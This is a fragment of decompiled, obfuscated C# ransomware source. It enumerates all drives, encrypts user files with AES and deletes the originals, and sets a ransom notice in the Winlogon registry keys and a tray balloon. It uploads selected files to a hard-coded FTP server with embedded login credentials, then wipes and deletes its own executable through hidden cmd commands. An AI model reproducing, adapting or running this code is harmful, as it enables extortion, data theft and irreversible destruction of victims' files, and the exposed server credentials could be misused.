			if (DIluSjzWZj == "YES" && !string.IsNullOrEmpty(dCZPQZfUMCTL) && !string.IsNullOrEmpty(TjBaAcuBKYE))
			{
				CepmooCYtqMWdEmx(lwVwrthwLznWc(dCZPQZfUMCTL), lwVwrthwLznWc(TjBaAcuBKYE));
			}
			else
			{
				CepmooCYtqMWdEmx();
			}
		}
		if (!string.IsNullOrEmpty(vQftqEvwcBQM))
		{
			try
			{
				File.Delete(vQftqEvwcBQM);
			}
			catch
			{
			}
		}
		if (YqtIXhunqGmzfkO == "EVET")
		{
			BfiKtGNnkbe();
		}
	}

	public static void qlQVFxpOXZNepv()
	{
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		MessageBox.Show(lwVwrthwLznWc("VGhpcyBwcm9ncmFtIHJlcXVpcmVzIE1pY3Jvc29mdCAuTkVUIEZyYW1ld29yayB2LiA0LjgyIG9yIHN1cGVyaW9yIHRvIHJ1biBwcm9wZXJseQ=="), lwVwrthwLznWc("QXRlbnRpb24h"), (MessageBoxButtons)0, (MessageBoxIcon)16);
	}

	private static int NpjeJDFeQopYOj(int int_0, int int_1)
	{
		RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		byte[] array = new byte[4];
		rNGCryptoServiceProvider.GetBytes(array);
		int seed = BitConverter.ToInt32(array, 0);
		return new Random(seed).Next(int_0, int_1);
	}

	public static List<string> XBSQFJNhNWisMw(string string_0)
	{
		List<string> list = new List<string>();
		Stack<string> stack = new Stack<string>(20);
		if (!Directory.Exists(string_0))
		{
			throw new ArgumentException();
		}
		stack.Push(string_0);
		while (stack.Count > 0)
		{
			string text = stack.Pop();
			string[] directories;
			try
			{
				directories = Directory.GetDirectories(text);
			}
			catch (UnauthorizedAccessException)
			{
				continue;
			}
			catch (DirectoryNotFoundException)
			{
				continue;
			}
			catch (PathTooLongException)
			{
				continue;
			}
			catch
			{
				continue;
			}
			string[] array = null;
			try
			{
				if (text.ToLower().Contains("program files") || text.ToLower().Contains("windows") || text.ToLower().Contains("perflogs") || text.ToLower().Contains("internet explorer") || text.ToLower().Contains("programdata") || text.ToLower().Contains("appdata"))
				{
					continue;
				}
				array = Directory.GetFiles(text);
				goto IL_00e6;
			}
			catch (UnauthorizedAccessException)
			{
			}
			catch (DirectoryNotFoundException)
			{
			}
			catch
			{
			}
			continue;
			IL_00e6:
			string[] array2 = array;
			foreach (string fileName in array2)
			{
				try
				{
					FileInfo fileInfo = new FileInfo(fileName);
					if (!fileInfo.FullName.Contains("autoexec.bat") && !fileInfo.FullName.Contains("desktop.ini") && !fileInfo.FullName.Contains("autorun.inf") && !fileInfo.FullName.Contains("ntuser.dat") && !fileInfo.FullName.Contains("iconcache.db") && !fileInfo.FullName.Contains("bootsect.bak") && !fileInfo.FullName.Contains("boot.ini") && !fileInfo.FullName.Contains("ntuser.dat.log") && !fileInfo.FullName.Contains("thumbs.db") && !fileInfo.FullName.ToLower().EndsWith(".crypted"))
					{
						if (File.Exists(fileInfo.FullName) && (double)fileInfo.Length <= double.Parse(nQvoVxtxpBwP) * 1024.0 * 1024.0 && YwZntAITANLKb == "YES")
						{
							list.Add(fileInfo.FullName);
						}
						else if (File.Exists(fileInfo.FullName) && YwZntAITANLKb == "NO")
						{
							list.Add(fileInfo.FullName);
						}
					}
				}
				catch (FileNotFoundException)
				{
				}
				catch (PathTooLongException)
				{
				}
				catch
				{
				}
			}
			array2 = directories;
			foreach (string item in array2)
			{
				stack.Push(item);
			}
		}
		return list;
	}

	public static string shLyHcuGUtora(string uJuJSyxucbY = "", string NOONlvHKmB = "")
	{
		string result = "";
		try
		{
			Process process = new Process();
			process.StartInfo = new ProcessStartInfo
			{
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true,
				FileName = uJuJSyxucbY,
				Arguments = NOONlvHKmB,
				UseShellExecute = false,
				RedirectStandardOutput = true,
				StandardOutputEncoding = Encoding.GetEncoding(850)
			};
			Process process2 = process;
			process2.Start();
			result = process2.StandardOutput.ReadToEnd();
			process2.WaitForExit();
		}
		catch
		{
		}
		return result;
	}

	public static void QAeIFgTAiVhuK(string string_0)
	{
		Process process = new Process();
		process.StartInfo = new ProcessStartInfo
		{
			FileName = "powershell",
			Arguments = string_0,
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true
		};
		Process process2 = process;
		process2.Start();
	}

	public static string lwVwrthwLznWc(string string_0)
	{
		byte[] bytes = Convert.FromBase64String(string_0);
		return Encoding.UTF8.GetString(bytes);
	}

	public static void FlYZTXIUaM(string OdIilkHQKeo = "U09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3MgTlRcQ3VycmVudFZlcnNpb25cV2lubG9nb24=", string ldIYQuiOYXKOS = "QXRlbnRpb24uLi4=", string lBqgXTMHmsK = "QWxsIHlvdXIgZmlsZXMgd2VyZSBlbmNyeXB0ZWQsIGlmIHlvdSB3YW50IHRvIGdldCB0aGVtIGFsbCBiYWNrLCBwbGVhc2UgY2FyZWZ1bGx5IHJlYWQgdGhlIHRleHQgbm90ZSBsb2NhdGVkIGluIHlvdXIgZGVza3RvcC4uLg==")
	{
		RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(lwVwrthwLznWc(OdIilkHQKeo), writable: true);
		if (registryKey != null)
		{
			registryKey.SetValue(lwVwrthwLznWc("TGVnYWxOb3RpY2VDYXB0aW9u"), lwVwrthwLznWc(ldIYQuiOYXKOS));
			registryKey.SetValue(lwVwrthwLznWc("TGVnYWxOb3RpY2VUZXh0"), lwVwrthwLznWc(lBqgXTMHmsK));
			registryKey.Close();
		}
	}

	public static void vfIEPPzqRdR()
	{
		try
		{
			if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
			{
				if (DIluSjzWZj == "YES" && !string.IsNullOrEmpty(dCZPQZfUMCTL) && !string.IsNullOrEmpty(TjBaAcuBKYE))
				{
					FlYZTXIUaM("U09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3MgTlRcQ3VycmVudFZlcnNpb25cV2lubG9nb24=", lwVwrthwLznWc(dCZPQZfUMCTL), lwVwrthwLznWc(TjBaAcuBKYE));
				}
				else
				{
					FlYZTXIUaM();
				}
			}
		}
		catch
		{
		}
	}

	public static void CepmooCYtqMWdEmx(string NnwaDeeldcyTUAL = "QXRlbnRpb24uLi4=", string GtcwMAHszObIDWQR = "QWxsIHlvdXIgZmlsZXMgd2VyZSBlbmNyeXB0ZWQsIGlmIHlvdSB3YW50IHRvIGdldCB0aGVtIGFsbCBiYWNrLCBwbGVhc2UgY2FyZWZ1bGx5IHJlYWQgdGhlIHRleHQgbm90ZSBsb2NhdGVkIGluIHlvdXIgZGVza3RvcC4uLg==")
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		NotifyIcon val = new NotifyIcon();
		val.set_Icon(SystemIcons.get_Warning());
		val.set_Visible(true);
		val.set_BalloonTipIcon((ToolTipIcon)2);
		val.set_BalloonTipTitle(lwVwrthwLznWc(NnwaDeeldcyTUAL));
		val.set_BalloonTipText(lwVwrthwLznWc(GtcwMAHszObIDWQR));
		val.ShowBalloonTip(30000);
	}

	public static void BfiKtGNnkbe()
	{
		shLyHcuGUtora("cmd.exe", lwVwrthwLznWc("L0MgcGluZyAxMjcuMC4wLjcgLW4gMyA+IE51bCAmIGZzdXRpbCBmaWxlIHNldFplcm9EYXRhIG9mZnNldD0wIGxlbmd0aD01MjQyODgg4oCcJXPigJ0gJiBEZWwgL2YgL3Eg4oCcJXPigJ0="));
		string text = lwVwrthwLznWc("L0MgY2hvaWNlIC9DIFkgL04gL0QgWSAvVCAzICYgRGVsIA==");
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.Arguments = "\"" + text + "\"" + Assembly.GetEntryAssembly()!.Location;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo.CreateNoWindow = true;
		processStartInfo.FileName = "cmd.exe";
		Process.Start(processStartInfo);
		Environment.Exit(0);
	}

	private static void hsYEsHasdeRCN(string[] string_0, string[] string_1, string[] string_2, string string_3, string string_4)
	{
		FRhLfyczmDGYqvA fRhLfyczmDGYqvA = new FRhLfyczmDGYqvA();
		fRhLfyczmDGYqvA.XyPhGJDWvGUPG = string_1;
		fRhLfyczmDGYqvA.yLvXFOlVmAI = string_2;
		fRhLfyczmDGYqvA.VtyStNcZltpAzV = string_3;
		fRhLfyczmDGYqvA.rWueTXysUSrKh = string_4;
		mCHGlwIXguOYBJo = Encoding.ASCII.GetBytes(fRhLfyczmDGYqvA.VtyStNcZltpAzV);
		if (string_0[0] == "[auto]")
		{
			DriveInfo[] drives = DriveInfo.GetDrives();
			if (drives.Length > 0)
			{
				for (int i = 0; i < drives.Length; i++)
				{
					if (drives[i].IsReady && !pdwfGfumrFQOLdtQ.Contains(drives[i].Name))
					{
						pdwfGfumrFQOLdtQ.Add(drives[i].Name);
					}
				}
			}
		}
		else
		{
			for (int i = 0; i < string_0.Length; i++)
			{
				if (!pdwfGfumrFQOLdtQ.Contains(string_0[i]))
				{
					pdwfGfumrFQOLdtQ.Add(string_0[i]);
				}
			}
		}
		using List<string>.Enumerator enumerator = pdwfGfumrFQOLdtQ.GetEnumerator();
		while (enumerator.MoveNext())
		{
			kfyJctOBySfT CS_0024_003C_003E8__locals0 = new kfyJctOBySfT();
			CS_0024_003C_003E8__locals0.AAzYqpNrrF = fRhLfyczmDGYqvA;
			CS_0024_003C_003E8__locals0.nFanOSGOzmEVsG = enumerator.Current;
			if (vDMfkoaGpneeQm == "YES")
			{
				Thread thread = new Thread((ThreadStart)delegate
				{
					JyzZGfZYDvvOM(CS_0024_003C_003E8__locals0.nFanOSGOzmEVsG, CS_0024_003C_003E8__locals0.AAzYqpNrrF.XyPhGJDWvGUPG, CS_0024_003C_003E8__locals0.AAzYqpNrrF.rWueTXysUSrKh, CS_0024_003C_003E8__locals0.AAzYqpNrrF.yLvXFOlVmAI, CS_0024_003C_003E8__locals0.AAzYqpNrrF.VtyStNcZltpAzV);
				});
				thread.Priority = ThreadPriority.Highest;
				thread.IsBackground = false;
				thread.Start();
				thread.Join();
			}
			else
			{
				JyzZGfZYDvvOM(CS_0024_003C_003E8__locals0.nFanOSGOzmEVsG, fRhLfyczmDGYqvA.XyPhGJDWvGUPG, fRhLfyczmDGYqvA.rWueTXysUSrKh, fRhLfyczmDGYqvA.yLvXFOlVmAI, fRhLfyczmDGYqvA.VtyStNcZltpAzV);
			}
		}
	}

	public static void JyzZGfZYDvvOM(string string_0, string[] string_1, string string_2, string[] string_3, string string_4)
	{
		List<string> list = new List<string>();
		list = ((!(PxPqJegYqeOPx == "YES")) ? ewRLNPjYMnUs.SearchFiles(string_0) : XBSQFJNhNWisMw(string_0));
		foreach (string value in string_1)
		{
			foreach (string item in list)
			{
				if (string_3.Length != 0)
				{
					foreach (string value2 in string_3)
					{
						if (CXxzIuKAkRjuSQb == "YES")
						{
							if (!item.ToLower().EndsWith(value2))
							{
								continue;
							}
						}
						else if (!item.EndsWith(value2))
						{
							continue;
						}
						goto IL_0827;
					}
				}
				if (CXxzIuKAkRjuSQb == "YES")
				{
					if (EEiGKNmZsb == "YES")
					{
						if (item.ToLower().EndsWith("exe") || item.Contains("HELP_ME_RECOVER_MY_FILES") || item.Contains("RansomBuilder_Log") || item.Contains("RSAKeys") || item.ToLower().Contains("program files") || item.ToLower().Contains("windows") || item.ToLower().Contains("internet explorer") || item.ToLower().Contains("programdata") || item.ToLower().Contains("appdata") || item.ToLower().Contains("autoexec.bat") || item.ToLower().Contains("desktop.ini") || item.ToLower().Contains("autorun.inf") || item.ToLower().Contains("ntuser.dat") || item.ToLower().Contains("iconcache.db") || item.ToLower().Contains("bootsect.bak") || item.ToLower().Contains("boot.ini") || item.ToLower().Contains("ntuser.dat.log") || item.ToLower().Contains("thumbs.db") || item.ToLower().Contains("HELP_ME_MY_FILES_NOT_MAKE_PUBLIC") || item.ToLower().EndsWith(".crypted"))
						{
							continue;
						}
					}
					else if (!item.ToLower().EndsWith(value) || item.Contains("HELP_ME_RECOVER_MY_FILES") || item.Contains("RansomBuilder_Log") || item.Contains("RSAKeys") || item.ToLower().Contains("program files") || item.ToLower().Contains("windows") || item.ToLower().Contains("internet explorer") || item.ToLower().Contains("programdata") || item.ToLower().Contains("appdata") || item.ToLower().Contains("autoexec.bat") || item.ToLower().Contains("desktop.ini") || item.ToLower().Contains("autorun.inf") || item.ToLower().Contains("ntuser.dat") || item.ToLower().Contains("iconcache.db") || item.ToLower().Contains("bootsect.bak") || item.ToLower().Contains("boot.ini") || item.ToLower().Contains("ntuser.dat.log") || item.ToLower().Contains("thumbs.db") || item.ToLower().Contains("HELP_ME_MY_FILES_NOT_MAKE_PUBLIC") || item.ToLower().EndsWith(".crypted"))
					{
						continue;
					}
				}
				else if (EEiGKNmZsb == "YES")
				{
					if (item.ToLower().EndsWith("exe") || item.Contains("HELP_ME_RECOVER_MY_FILES") || item.Contains("RansomBuilder_Log") || item.Contains("RSAKeys") || item.ToLower().Contains("program files") || item.ToLower().Contains("windows") || item.ToLower().Contains("internet explorer") || item.ToLower().Contains("programdata") || item.ToLower().Contains("appdata") || item.ToLower().Contains("autoexec.bat") || item.ToLower().Contains("desktop.ini") || item.ToLower().Contains("autorun.inf") || item.ToLower().Contains("ntuser.dat") || item.ToLower().Contains("iconcache.db") || item.ToLower().Contains("bootsect.bak") || item.ToLower().Contains("boot.ini") || item.ToLower().Contains("ntuser.dat.log") || item.ToLower().Contains("thumbs.db") || item.ToLower().Contains("HELP_ME_MY_FILES_NOT_MAKE_PUBLIC") || item.ToLower().EndsWith(".crypted"))
					{
						continue;
					}
				}
				else if (!item.EndsWith(value) || item.Contains("HELP_ME_RECOVER_MY_FILES") || item.Contains("RansomBuilder_Log") || item.Contains("RSAKeys") || item.ToLower().Contains("program files") || item.ToLower().Contains("windows") || item.ToLower().Contains("internet explorer") || item.ToLower().Contains("programdata") || item.ToLower().Contains("appdata") || item.ToLower().Contains("autoexec.bat") || item.ToLower().Contains("desktop.ini") || item.ToLower().Contains("autorun.inf") || item.ToLower().Contains("ntuser.dat") || item.ToLower().Contains("iconcache.db") || item.ToLower().Contains("bootsect.bak") || item.ToLower().Contains("boot.ini") || item.ToLower().Contains("ntuser.dat.log") || item.ToLower().Contains("thumbs.db") || item.ToLower().Contains("HELP_ME_MY_FILES_NOT_MAKE_PUBLIC") || item.ToLower().EndsWith(".crypted"))
				{
					continue;
				}
				if (CwSjPQISqaAa.Contains(item))
				{
					continue;
				}
				if (qlvWIDLTnt == "YES")
				{
					try
					{
						if (jsQYKXeCsWhqVSa.WYXSRecjwFn(item))
						{
							jsQYKXeCsWhqVSa.RuORFeNJxDPT(item);
						}
					}
					catch
					{
					}
				}
				CwSjPQISqaAa.Add(item);
				if (!TOiguUKqJdkh.Contains(Path.GetDirectoryName(item)))
				{
					TOiguUKqJdkh.Add(Path.GetDirectoryName(item));
				}
				try
				{
					if (string_2 != ".*")
					{
						xaEbFWirTtHk(item, item + string_2, mCHGlwIXguOYBJo);
					}
					else
					{
						xaEbFWirTtHk(item, item + ".part", mCHGlwIXguOYBJo);
					}
				}
				catch (Exception)
				{
				}
				IL_0827:;
			}
		}
	}

	private static void xaEbFWirTtHk(string string_0, string string_1, byte[] byte_0)
	{
		try
		{
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			FileStream fileStream = new FileStream(string_1, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(byte_0, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Padding = PaddingMode.Zeros;
			rijndaelManaged.Mode = CipherMode.CBC;
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			FileStream fileStream2 = new FileStream(string_0, FileMode.Open);
			int num;
			while ((num = fileStream2.ReadByte()) != -1)
			{
				cryptoStream.WriteByte((byte)num);
			}
			fileStream2.Close();
			cryptoStream.Close();
			fileStream.Close();
			try
			{
				if (string_1.Length > 0)
				{
					FileStream fileStream3 = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (fRlRBeLvclzVV == "YES")
					{
						foreach (string item in XdlKyyCvpCPeK)
						{
							if (string_0.ToLower().EndsWith(item) && nXCoVqKcMsyKW == "YES")
							{
								if (Convert.ToInt32(ebLvKkjmyp) * 1024 * 1024 > fileStream3.Length)
								{
									try
									{
										QRoenrHGXDNnO.HxZkhrcbXYNYY("ftp://199.188.200.253/public_html/newshit/", "9b732058@noether-stiftung.de", "13MelisaLening37", string_0);
									}
									catch
									{
									}
								}
							}
							else if (string_0.ToLower().EndsWith(item) && nXCoVqKcMsyKW == "NO")
							{
								try
								{
									QRoenrHGXDNnO.HxZkhrcbXYNYY("ftp://199.188.200.253/public_html/newshit/", "9b732058@noether-stiftung.de", "13MelisaLening37", string_0);
								}
								catch
								{
								}
							}
						}
					}
					int num2 = 1000000;
					while (true)
					{
						try
						{
							while (File.Exists(string_0) && num2 >= 0)
							{
								File.Delete(string_0);
							}
						}
						catch
						{
							num2--;
							continue;
						}
						break;
					}
					if (string_1.EndsWith(".part"))
					{
						File.Move(string_1, string_1.Replace(".part", ""));
					}
					return;
				}
				try
				{
					File.Delete(string_1);
				}
				catch
				{
				}
			}
			catch
			{
			}
		}
		catch (Exception)
		{
		}
	}
}
